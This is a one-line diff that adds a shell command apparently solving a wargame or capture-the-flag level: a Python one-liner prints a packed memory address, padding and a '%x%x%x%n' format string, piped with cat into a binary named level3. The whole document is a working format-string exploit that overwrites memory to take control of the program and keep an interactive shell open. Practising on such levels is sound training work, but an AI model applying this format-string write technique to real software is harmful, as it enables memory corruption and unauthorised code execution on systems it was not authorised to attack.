@@ -1,0 +1,1 @@
+(python -c "print '\x8c\x98\x04\x08' + 'A'*41 + '%x%x%x%n'"; cat) | ./level3
